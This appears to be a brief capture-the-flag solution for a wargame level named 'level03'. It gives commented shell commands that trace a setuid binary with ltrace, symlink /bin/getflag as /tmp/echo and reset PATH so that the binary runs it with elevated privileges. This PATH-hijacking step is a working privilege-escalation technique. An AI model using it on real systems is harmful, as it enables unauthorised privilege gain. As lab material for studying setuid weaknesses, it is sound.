# About setgid, setuid and sticky bit
# https://ruvds.com/ru/helpcenter/suid-sgid-sticky-bit-linux/

# Looking for a function calling traces
ltrace ./level03

# Creating symbolic link to getflag from echo 
ln -s /bin/getflag /tmp/echo

# Calling executable replacing the path where the executable file will be searched
PATH=/tmp ./level03